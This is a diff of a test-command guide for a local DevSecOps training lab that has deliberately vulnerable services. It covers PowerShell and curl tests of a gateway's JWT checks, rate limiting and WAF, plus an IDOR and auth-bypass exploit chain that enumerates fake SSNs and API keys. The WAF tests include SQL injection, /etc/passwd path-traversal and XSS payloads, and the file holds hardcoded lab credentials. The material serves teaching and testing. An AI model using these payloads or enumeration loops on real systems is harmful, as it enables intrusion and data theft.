@@ -1,152 +1,578 @@
 # Test Commands - Phase 2.2
 
-## Grupa 1: API Gateway - Podstawy ✅
+## Group 1: API Gateway - Basics ✅ COMPLETED
 
-### 1. Build i uruchom API Gateway
+### Build and Test
+```powershell
+docker-compose build api-gateway
+docker-compose up -d api-gateway
+curl http://localhost:8080/health
+curl -X POST http://localhost:8080/auth/login -H "Content-Type: application/json" -d '{\"username\":\"admin\",\"password\":\"admin123\"}'
+```
+
+---
+
+## Group 2: Gateway Security (JWT + WAF + Metrics) 🔒
+
+### 1. Rebuild and Start with Changes
 
 ```powershell
-# Build i start gateway
+# Rebuild gateway with new code
 docker-compose build api-gateway
 docker-compose up -d api-gateway
 
-# Sprawdź status
-docker-compose ps api-gateway
-
-# Sprawdź logi
+# Check logs
 docker-compose logs -f api-gateway
 ```
 
-### 2. Test Health Check
+### 2. Test Metrics Endpoint
 
 ```powershell
-# Health check gateway (powinien pokazać status backend services)
-curl http://localhost:8080/health
+# Fetch Prometheus metrics
+curl http://localhost:8080/metrics
 
-# Oczekiwany output:
+# Expected output: metrics in Prometheus format
+# gateway_requests_total
+# gateway_jwt_validation_total
+# gateway_rate_limit_blocks_total
+# gateway_backend_requests_total
+```
+
+### 3. Test JWT Validation - Protected Endpoint
+
+```powershell
+# Step 1: Login and get token
+$mfaCode = docker exec login-api python -c "import pyotp; print(pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30).now())"
+
+$loginResp = curl.exe -X POST http://localhost:8080/auth/login -H "Content-Type: application/json" -d '{\"username\":\"admin\",\"password\":\"admin123\"}' | ConvertFrom-Json
+
+$verifyResp = curl.exe -X POST http://localhost:8080/auth/mfa/verify -H "Content-Type: application/json" -d "{\"challenge_id\":\"$($loginResp.challenge_id)\",\"code\":\"$mfaCode\"}" | ConvertFrom-Json
+
+$accessToken = $verifyResp.access_token
+
+# Step 2: Test protected endpoint WITHOUT token (401)
+curl http://localhost:8080/protected
+
+# Expected output:
+# {"detail":"Missing authorization header"}
+
+# Step 3: Test protected endpoint WITH token (200)
+curl http://localhost:8080/protected -H "Authorization: Bearer $accessToken"
+
+# Expected output:
 # {
-#   "status": "healthy" lub "degraded",
-#   "service": "API Gateway",
-#   "version": "0.1.0",
-#   "environment": "development",
-#   "backends": {
-#     "auth-service": {
-#       "status": "healthy",
-#       "url": "http://login-api:8000"
-#     }
-#   }
+#   "message": "Access granted to protected resource",
+#   "user": "admin",
+#   "token_type": "access",
+#   "authenticated": true
+# }
+
+# Step 4: Test with invalid token (401)
+curl http://localhost:8080/protected -H "Authorization: Bearer invalid_token_here"
+
+# Expected output:
+# {"detail":"Could not validate credentials: ..."}
+```
+
+### 4. Test Rate Limiting
+
+```powershell
+# Test 1: Single requests (should pass)
+for ($i=1; $i -le 5; $i++) {
+    curl http://localhost:8080/ 
+    Write-Host "Request $i completed"
+    Start-Sleep -Milliseconds 500
+}
+
+# Test 2: Burst requests (exceed limit)
+# Send 15 requests quickly (limit: 10 burst)
+for ($i=1; $i -le 15; $i++) {
+    $response = curl.exe -s -o response.txt -w "%{http_code}" http://localhost:8080/
+    Write-Host "Request $i - Status: $response"
+}
+
+# Expected output:
+# First 10-12: 200 OK
+# Next ones: 429 Too Many Requests
+# Response body for 429:
+# {
+#   "error": "Rate Limit Exceeded",
+#   "message": "Too many requests. Limit: 60 requests per minute.",
+#   "retry_after": 60
+# }
+
+# Check rate limit headers
+curl -I http://localhost:8080/
+# X-RateLimit-Limit: 60
+# X-RateLimit-Remaining: 9
+```
+
+### 5. Test WAF - Suspicious Patterns
+
+```powershell
+# Test 1: SQL Injection pattern
+curl "http://localhost:8080/auth/login?id=1' OR '1'='1"
+
+# Expected output (400):
+# {
+#   "error": "Bad Request",
+#   "message": "Request contains suspicious pattern",
+#   "blocked_by": "WAF"
+# }
+
+# Test 2: Path traversal
+curl "http://localhost:8080/../../etc/passwd"
+
+# Expected output (400):
+# Same as above
+
+# Test 3: XSS pattern
+curl "http://localhost:8080/search?q=<script>alert('xss')</script>"
+
+# Expected output (400)
+
+# Test 4: Valid request (not blocked)
+curl http://localhost:8080/auth/login
+# Should return 405 Method Not Allowed (because GET), but not WAF block
+```
+
+### 6. Test WAF - Oversized Request
+
+```powershell
+# Create large file (>10MB)
+$largeData = "x" * (11 * 1024 * 1024)  # 11MB
+
+# Send oversized request
+curl -X POST http://localhost:8080/auth/login `
+  -H "Content-Type: application/json" `
+  -d $largeData
+
+# Expected output (413):
+# {
+#   "error": "Request Entity Too Large",
+#   "message": "Request body exceeds maximum size of 10485760 bytes",
+#   "blocked_by": "WAF"
 # }
 ```
 
-### 3. Test Gateway Info Endpoint
+### 7. Test Security Headers
 
 ```powershell
-# Root endpoint
-curl http://localhost:8080/
+# Check security headers in response
+curl -I http://localhost:8080/
 
-# Oczekiwany output: informacje o dostępnych endpointach
+# Expected headers:
+# X-Content-Type-Options: nosniff
+# X-Frame-Options: DENY
+# X-XSS-Protection: 1; mode=block
+# Referrer-Policy: strict-origin-when-cross-origin
+# X-Gateway: DevSecOps-API-Gateway
+# X-Gateway-Version: 0.1.0
+# X-Response-Time: 0.XXXs
 ```
 
-### 4. Test Routing do Auth Service
+### 8. Test Complete Auth Flow through Gateway with Metrics
 
 ```powershell
-# Test 1: Login endpoint przez gateway
-curl -X POST http://localhost:8080/auth/login `
-  -H "Content-Type: application/json" `
-  -d '{\"username\":\"admin\",\"password\":\"admin123\"}'
-
-# Oczekiwany output: response z challenge_id (MFA)
-
-# Test 2: Health check auth-service przez gateway
-curl http://localhost:8080/auth/../health
-
-# Test 3: Bezpośredni dostęp do auth-service (powinien działać - będziemy to blokować w kolejnych fazach)
-curl http://localhost:8000/health
-```
-
-### 5. Test Complete Auth Flow przez Gateway
-
-```powershell
-# Krok 1: Login
-$loginResponse = curl -X POST http://localhost:8080/auth/login `
+# 1. Login
+$login = curl.exe -X POST http://localhost:8080/auth/login `
   -H "Content-Type: application/json" `
   -d '{\"username\":\"admin\",\"password\":\"admin123\"}' | ConvertFrom-Json
 
-$challengeId = $loginResponse.challenge_id
+# 2. Get MFA code
+$mfa = docker exec login-api python -c "import pyotp; print(pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30).now())"
 
-# Krok 2: Pobierz MFA code z logów
-docker-compose logs login-api | Select-String "mfa_code"
-
-# Krok 3: MFA verify (wstaw prawdziwy kod)
-curl -X POST http://localhost:8080/auth/mfa/verify `
+# 3. Verify MFA
+$tokens = curl.exe -X POST http://localhost:8080/auth/mfa/verify `
   -H "Content-Type: application/json" `
-  -d "{\"challenge_id\":\"$challengeId\",\"code\":\"123456\"}"
+  -d "{\"challenge_id\":\"$($login.challenge_id)\",\"code\":\"$mfa\"}" | ConvertFrom-Json
 
-# Oczekiwany output: JWT tokens
+# 4. Access protected endpoint
+curl http://localhost:8080/protected `
+  -H "Authorization: Bearer $($tokens.access_token)"
+
+# 5. Check metrics
+curl http://localhost:8080/metrics | Select-String "gateway_"
+
+# Should contain:
+# gateway_requests_total{method="POST",path="/auth/*",status_code="200"}
+# gateway_jwt_validation_total{result="success"}
+# gateway_backend_requests_total{backend="auth-service",method="POST",status_code="200"}
 ```
 
-### 6. Test Error Handling
+### 9. Verify Prometheus Scraping
 
 ```powershell
-# Test 404 - nieistniejąca ścieżka
-curl http://localhost:8080/nonexistent
+# Check if Prometheus is scraping gateway
+curl http://localhost:9090/api/v1/targets | ConvertFrom-Json | 
+  Select-Object -ExpandProperty data | 
+  Select-Object -ExpandProperty activeTargets | 
+  Where-Object {$_.labels.job -eq "api-gateway"}
 
-# Test 503 - gdy backend jest down
-docker-compose stop login-api
-curl http://localhost:8080/auth/login
-docker-compose start login-api
+# Query metrics in Prometheus
+curl "http://localhost:9090/api/v1/query?query=gateway_requests_total"
+curl "http://localhost:9090/api/v1/query?query=gateway_rate_limit_blocks_total"
 ```
 
-### 7. Weryfikacja Docker Network
+### 10. Stress Test - Rate Limiter Effectiveness
 
 ```powershell
-# Sprawdź czy gateway widzi inne serwisy
-docker exec api-gateway ping -c 3 login-api
-docker exec api-gateway ping -c 3 redis
+# Mass test - 100 requests
+$successCount = 0
+$rateLimitedCount = 0
 
-# Sprawdź resolving DNS
-docker exec api-gateway nslookup login-api
-```
+for ($i=1; $i -le 100; $i++) {
+    $status = curl.exe -s -o $null -w "%{http_code}" http://localhost:8080/
+    if ($status -eq "200") { $successCount++ }
+    if ($status -eq "429") { $rateLimitedCount++ }
+}
 
-### 8. Performance Check
+Write-Host "Success: $successCount, Rate Limited: $rateLimitedCount"
 
-```powershell
-# Test latencji przez gateway vs bezpośrednio
-Measure-Command { curl http://localhost:8080/health }
-Measure-Command { curl http://localhost:8000/health }
-
-# Gateway powinien dodać ~10-50ms overhead
+# Expected result: 
+# Most requests rate limited (> 80%)
 ```
 
 ---
 
-## ✅ Kryteria Sukcesu Grupy 1
+## ✅ Success Criteria - Group 2
 
-- [ ] Gateway działa na porcie 8080
-- [ ] Health check zwraca status "healthy" dla auth-service
-- [ ] Routing `/auth/*` przekierowuje do login-api
-- [ ] Login flow działa przez gateway
-- [ ] MFA verification działa przez gateway
-- [ ] Error handling zwraca sensowne komunikaty
-- [ ] Gateway łączy się z login-api przez Docker network
+- [ ] Metrics endpoint returns Prometheus metrics
+- [ ] Protected endpoint requires JWT (401 without token)
+- [ ] Protected endpoint accepts valid JWT (200)
+- [ ] Rate limiter blocks excess requests (429)
+- [ ] WAF blocks suspicious patterns (400)
+- [ ] WAF blocks oversized requests (413)
+- [ ] Security headers are added to all responses
+- [ ] Metrics are properly tracked (requests, JWT validation, backend calls)
+- [ ] Logs contain timing and IP address information
 
 ---
 
-## 🚀 Następny Krok
+## 🚀 Next Step - Commit
 
-**Grupa 2: Gateway Security**
 ```powershell
-# Po pomyślnym zakończeniu Grupy 1, wykonaj:
 git add vulnerable-services/api-gateway/
 git add docker-compose.yml
-git commit -m "feat(gateway): Dodaj podstawowy API Gateway z routingiem do auth-service (Faza 2.2 - Krok 1)
+git add TEST_COMMANDS.md
+git commit -m "feat(gateway): Add JWT validation, WAF rules and Prometheus metrics (Phase 2.2 - Step 2)
 
-- Stworzono strukturę api-gateway z FastAPI
-- Health check z monitoringiem backend services
-- Routing /auth/* -> login-api:8000
-- Reverse proxy z httpx
-- Error handling (503, 504, 502)
-- CORS middleware
-- Dodano do docker-compose.yml (port 8080)
-- Health check w Dockerfile i docker-compose
+Security Features:
+- JWT verification middleware for protected endpoints
+- Rate limiting (60 req/min, burst 10) with Token Bucket algorithm
+- WAF rules (SQL injection, XSS, path traversal detection)
+- Request size validation (max 10MB)
+- Security headers (X-Frame-Options, X-Content-Type-Options, etc.)
+
+Monitoring:
+- Prometheus metrics endpoint (/metrics)
+- Gateway request tracking with labels
+- JWT validation metrics
+- Rate limiter metrics
+- WAF block metrics
+- Backend proxy metrics with duration histograms
+
+Demo Endpoints:
+- GET /protected - requires valid JWT token
+- GET /metrics - Prometheus format metrics
+
+Files:
+- app/security.py - JWT validation utilities
+- app/middleware.py - Rate limiting, WAF, security headers, logging
+- app/metrics.py - Prometheus metrics definitions
+- app/main.py - Updated with middleware integration
+- app/config.py - Rate limiter & WAF configuration
+"
+```
+
+---
+
+## Group 3: User Service with IDOR & Auth Bypass Vulnerabilities 🚨
+
+### 1. Build and Start User Service
+
+```powershell
+# Build user-service
+docker-compose build user-service
+
+# Start user-service
+docker-compose up -d user-service
+
+# Check logs
+docker-compose logs -f user-service
+
+# Rebuild gateway with user-service routing
+docker-compose build api-gateway
+docker-compose up -d api-gateway
+
+# Restart Prometheus to scrape new services
+docker-compose restart prometheus
+```
+
+### 2. Test User Service Health
+
+```powershell
+# Direct access to user-service
+curl http://localhost:8002/health
+
+# Expected output:
+# {
+#   "status": "healthy",
+#   "service": "user-service",
+#   "version": "0.1.0",
+#   "vulnerabilities": [
+#     "IDOR in /profile/{user_id}",
+#     "No authentication in /settings",
+#     "Sensitive data exposure"
+#   ]
+# }
+
+# Access through gateway
+curl http://localhost:8080/health
+
+# Should show both backends healthy:
+# "backends": {
+#   "auth-service": {"status": "healthy"},
+#   "user-service": {"status": "healthy"}
+# }
+```
+
+### 3. Test IDOR Vulnerability - Profile Endpoint
+
+```powershell
+# Step 1: Login as admin and get token
+$mfaCode = (docker exec login-api python -c "import pyotp; print(pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30).now())").Trim()
+
+$loginResp = curl.exe -s -X POST http://localhost:8080/auth/login -H "Content-Type: application/json" -d '{\"username\":\"admin\",\"password\":\"admin123\"}' | ConvertFrom-Json
+
+# Use temp file to avoid PowerShell escaping issues
+@{challenge_id=$loginResp.challenge_id; code=$mfaCode} | ConvertTo-Json -Compress | Out-File -FilePath mfa.json -Encoding ASCII
+
+$verifyResp = curl.exe -s -X POST http://localhost:8080/auth/mfa/verify -H "Content-Type: application/json" -d "@mfa.json" | ConvertFrom-Json
+
+$accessToken = $verifyResp.access_token
+
+# Step 2: Access admin's own profile (user_id=1) - NORMAL
+curl.exe http://localhost:8080/api/users/profile/1 -H "Authorization: Bearer $accessToken"
+
+# Expected output (200 OK):
+# {
+#   "user_id": "1",
+#   "username": "admin",
+#   "email": "admin@devsecops.local",
+#   "full_name": "Admin User",
+#   "ssn": "12345678901",  <-- Sensitive data!
+#   "credit_card": "**** **** **** 1234"
+# }
+
+# Step 3: IDOR EXPLOIT - Access user1's profile (user_id=2) 🚨
+curl.exe http://localhost:8080/api/users/profile/2 -H "Authorization: Bearer $accessToken"
+
+# Expected output (200 OK - VULNERABILITY!):
+# {
+#   "user_id": "2",
+#   "username": "user1",
+#   "email": "user1@devsecops.local",
+#   "ssn": "98765432109",  <-- Admin sees user1's SSN!
+#   ...
+# }
+
+# Step 4: Try all users (IDOR enumeration)
+for ($i=1; $i -le 4; $i++) {
+    Write-Host "=== User $i ==="
+    curl.exe http://localhost:8080/api/users/profile/$i -H "Authorization: Bearer $accessToken"
+}
+
+# Step 5: Check user-service logs for IDOR detection
+docker-compose logs user-service | Select-String "IDOR"
+
+# Expected log:
+# 🚨 IDOR EXPLOIT: User 'admin' accessed profile of 'user1' (user_id: 2)
+```
+
+### 4. Test Auth Bypass Vulnerability - Settings Endpoint
+
+```powershell
+# Step 1: Access settings WITHOUT any token 🚨
+curl "http://localhost:8080/api/users/settings?user_id=1"
+
+# Expected output (200 OK - NO AUTH REQUIRED!):
+# {
+#   "theme": "dark",
+#   "notifications_enabled": true,
+#   "two_factor_enabled": true,
+#   "api_key": "admin-secret-api-key-12345"  <-- Exposed!
+# }
+
+# Step 2: Enumerate all users' settings
+for ($i=1; $i -le 4; $i++) {
+    Write-Host "=== Settings for user $i ==="
+    curl "http://localhost:8080/api/users/settings?user_id=$i"
+}
+
+# Step 3: Try without user_id parameter
+curl "http://localhost:8080/api/users/settings"
+
+# Expected: defaults to user_id=1 (admin) - another vulnerability!
+
+# Step 4: Check logs for unauthorized access
+docker-compose logs user-service | Select-String "UNAUTHORIZED"
+
+# Expected log:
+# 🚨 UNAUTHORIZED ACCESS: /settings accessed without JWT
+```
+
+### 5. Test Direct Service Access (Bypass Gateway)
+
+```powershell
+# Access user-service DIRECTLY (port 8002), bypassing gateway 🚨
+curl http://localhost:8002/profile/1
+
+# Expected output (200 OK):
+# Returns profile without any authentication!
+
+# Check logs for direct access detection
+docker-compose logs user-service | Select-String "Direct access"
+
+# Expected log:
+# ⚠️ Direct access detected (bypassing gateway): /profile/1 from <IP>
+
+# Compare metrics: direct vs gateway
+curl http://localhost:8002/metrics | Select-String "user_service_direct_access"
+
+# Should show:
+# user_service_direct_access_total{endpoint="/profile/1",source_ip="..."}
+```
+
+### 6. Test User Service Metrics
+
+```powershell
+# Fetch user-service metrics
+curl http://localhost:8002/metrics
+
+# Key metrics to check:
+# user_service_idor_attempts_total - IDOR exploitation attempts
+# user_service_direct_access_total - Requests bypassing gateway
+# user_service_unauthorized_settings_access_total - Settings without JWT
+# user_service_requests_total - Total requests
+
+# Query metrics in Prometheus
+curl "http://localhost:9090/api/v1/query?query=user_service_idor_attempts_total"
+curl "http://localhost:9090/api/v1/query?query=user_service_direct_access_total"
+curl "http://localhost:9090/api/v1/query?query=user_service_unauthorized_settings_access_total"
+```
+
+### 7. Verify Prometheus Scraping
+
+```powershell
+# Check Prometheus targets
+curl http://localhost:9090/api/v1/targets | ConvertFrom-Json | 
+  Select-Object -ExpandProperty data | 
+  Select-Object -ExpandProperty activeTargets | 
+  Where-Object {$_.labels.job -in @("api-gateway", "user-service")}
+
+# Expected: Both api-gateway and user-service targets UP
+
+# Query gateway metrics
+curl "http://localhost:9090/api/v1/query?query=gateway_backend_requests_total"
+
+# Should show requests to both auth-service and user-service
+```
+
+### 8. Complete Exploit Chain
+
+```powershell
+# Full attack simulation:
+# 1. Login
+$mfaCode = (docker exec login-api python -c "import pyotp; print(pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30).now())").Trim()
+$loginResp = curl.exe -s -X POST http://localhost:8080/auth/login -H "Content-Type: application/json" -d '{\"username\":\"admin\",\"password\":\"admin123\"}' | ConvertFrom-Json
+@{challenge_id=$loginResp.challenge_id; code=$mfaCode} | ConvertTo-Json -Compress | Out-File -FilePath mfa.json -Encoding ASCII
+$verifyResp = curl.exe -s -X POST http://localhost:8080/auth/mfa/verify -H "Content-Type: application/json" -d "@mfa.json" | ConvertFrom-Json
+$token = $verifyResp.access_token
+
+# 2. IDOR - Steal all profiles
+Write-Host "`n=== IDOR ATTACK: Stealing all user profiles ==="
+for ($i=1; $i -le 4; $i++) {
+    $profile = curl.exe -s http://localhost:8080/api/users/profile/$i -H "Authorization: Bearer $token" | ConvertFrom-Json
+    Write-Host "User $i - SSN: $($profile.ssn), Email: $($profile.email)"
+}
+
+# 3. Auth Bypass - Steal all API keys
+Write-Host "`n=== AUTH BYPASS: Stealing all API keys ==="
+for ($i=1; $i -le 4; $i++) {
+    $settings = curl.exe -s "http://localhost:8080/api/users/settings?user_id=$i" | ConvertFrom-Json
+    Write-Host "User $i - API Key: $($settings.api_key)"
+}
+
+# 4. Check detection metrics
+Write-Host "`n=== Detection Metrics ==="
+curl.exe -s "http://localhost:9090/api/v1/query?query=user_service_idor_attempts_total" | ConvertFrom-Json | Select-Object -ExpandProperty data | Select-Object -ExpandProperty result
+curl.exe -s "http://localhost:9090/api/v1/query?query=user_service_unauthorized_settings_access_total" | ConvertFrom-Json | Select-Object -ExpandProperty data | Select-Object -ExpandProperty result
+```
+
+---
+
+## ✅ Success Criteria - Group 3
+
+- [ ] User service health endpoint works
+- [ ] Gateway health check shows both backends healthy
+- [ ] IDOR vulnerability: Can access other users' profiles
+- [ ] Auth bypass: Can access settings without JWT
+- [ ] Direct access: Can bypass gateway and access service directly
+- [ ] Metrics track IDOR attempts
+- [ ] Metrics track unauthorized settings access
+- [ ] Metrics track direct access bypassing gateway
+- [ ] Prometheus scrapes both gateway and user-service
+- [ ] Logs show vulnerability exploitation attempts
+
+---
+
+## 🚀 Next Step - Commit
+
+```powershell
+git add vulnerable-services/user-service/
+git add vulnerable-services/api-gateway/app/main.py
+git add docker-compose.yml
+git add monitoring/prometheus/prometheus.yml
+git add TEST_COMMANDS.md
+git commit -m "feat(user-service): Add User Service with IDOR and Auth Bypass vulnerabilities (Phase 2.2 - Step 3)
+
+Vulnerabilities:
+- IDOR in /profile/{user_id} - No authorization check (any user can access any profile)
+- Auth bypass in /settings - No JWT validation required
+- Sensitive data exposure (SSN, credit cards, API keys)
+- Direct service access detection (bypassing gateway)
+
+User Service Features:
+- GET /profile/{user_id} - Profile with sensitive data (VULNERABLE: IDOR)
+- GET /settings?user_id={id} - User settings with API keys (VULNERABLE: No Auth)
+- GET /health - Health check with vulnerability list
+- GET /metrics - Prometheus metrics endpoint
+- Fake user database (4 users: admin, user1, user2, testuser)
+
+Monitoring:
+- user_service_idor_attempts_total - Tracks IDOR exploitation
+- user_service_direct_access_total - Tracks gateway bypass
+- user_service_unauthorized_settings_access_total - Tracks auth bypass
+- user_service_requests_total - Total requests
+- user_service_request_duration_seconds - Request latency
+
+Gateway Updates:
+- Added /api/users/* routing to user-service
+- Updated health check to include user-service
+- Metrics track backend requests to user-service
+
+Prometheus:
+- Added scraping for api-gateway:8080/metrics
+- Added scraping for user-service:8000/metrics
+
+Files:
+- vulnerable-services/user-service/ - Complete service implementation
+- app/main.py - FastAPI with vulnerable endpoints
+- app/models.py - Pydantic models
+- app/metrics.py - Prometheus metrics
+- app/config.py - Configuration and fake database
+- Dockerfile - Container image
+- README.md - Vulnerability documentation
 "
 ```
